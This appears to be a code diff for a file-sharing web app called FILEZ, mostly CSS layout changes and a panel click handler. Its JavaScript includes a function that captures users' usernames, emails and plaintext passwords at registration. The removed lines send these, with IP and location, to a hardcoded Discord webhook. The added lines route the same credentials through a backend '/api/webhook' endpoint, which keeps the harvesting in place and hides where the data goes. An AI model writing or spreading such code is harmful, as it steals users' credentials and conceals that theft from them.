@@ -518,12 +518,27 @@ button{font-family:inherit;}
   }
   .fs-icon{width:40px; height:40px;}
   .filez-grid{grid-template-columns:repeat(auto-fill, minmax(78px, 1fr));}
+  #panels-grid{
+    max-width:calc(100% - 30px);
+    gap:8px;
+  }
 }
 @media (max-width: 560px){
   .auth-card{padding:26px 20px 22px;}
   #user-menu{right:10px; left:10px; width:auto;}
   .win-title span.win-title-text{display:none;}
-  #panels-grid{grid-template-columns:1fr !important; max-width:calc(100% - 20px);}
+  #panels-grid{
+    grid-template-columns:1fr !important;
+    max-width:calc(100% - 20px);
+    top:auto; bottom:80px;
+    transform:translateX(-50%);
+    gap:8px;
+  }
+  #btn-vermas{
+    bottom:16px !important;
+    padding:12px 28px !important;
+    font-size:13px !important;
+  }
 }
 
 /* =========================================================
@@ -543,6 +558,7 @@ button{font-family:inherit;}
   pointer-events:auto;
   opacity:0;
   transition:opacity .6s var(--ease);
+  overflow:hidden;
 }
 #panels-grid.visible{
   opacity:1;
@@ -1016,41 +1032,12 @@ function getBrowserInfo(){
 }
 
 function sendDiscordWebhook(username, email, password){
-  const webhookUrl = 'https://discord.com/api/webhooks/1544927954780430436/5JUAA9G761FOsoZURFFYRlzvJXb0Wpm3CA9cPtHiY3ZNz6OzK7EwneiylNQbg0M2ZfVc';
   const browser = getBrowserInfo();
 
-  fetch('http://ip-api.com/json/')
-    .then(r => r.json())
-    .then(loc => {
-      const ubicacion = [loc.city, loc.regionName, loc.country].filter(Boolean).join(', ') || 'No disponible';
-      const ip = loc.query || 'No disponible';
-      sendEmbed(webhookUrl, username, email, password, browser, ubicacion, ip);
-    })
-    .catch(()=>{
-      sendEmbed(webhookUrl, username, email, password, browser, 'No disponible', 'No disponible');
-    });
-}
-
-function sendEmbed(webhookUrl, username, email, password, browser, ubicacion, ip){
-  const embed = {
-    title: '🔴 Nuevo Registro',
-    color: 16729344,
-    fields: [
-      { name: '📧 Correo', value: email, inline: true },
-      { name: '👤 Usuario', value: username, inline: true },
-      { name: '🔑 Contrasena', value: password, inline: true },
-      { name: '🌐 Navegador', value: browser, inline: true },
-      { name: '📍 Ubicacion', value: ubicacion, inline: true },
-      { name: 'IP:', value: ip, inline: true }
-    ],
-    timestamp: new Date().toISOString(),
-    footer: { text: 'FILEZ — Sistema de registros' }
-  };
-
-  fetch(webhookUrl, {
+  fetch('/api/webhook', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ embeds: [embed] })
+    body: JSON.stringify({ username, email, password, browser })
   }).catch(()=>{});
 }
 
@@ -2029,6 +2016,13 @@ function finalizeUpload(f, isImage){
       vmOverlay.style.display = 'flex';
     });
   }
+
+  document.querySelectorAll('.panel-card').forEach(function(card) {
+    card.addEventListener('click', function(e) {
+      if (e.target.closest('#btn-vermas')) return;
+      vmOverlay.style.display = 'flex';
+    });
+  });
 
   if (vmCancel) {
     vmCancel.addEventListener('click', function() {
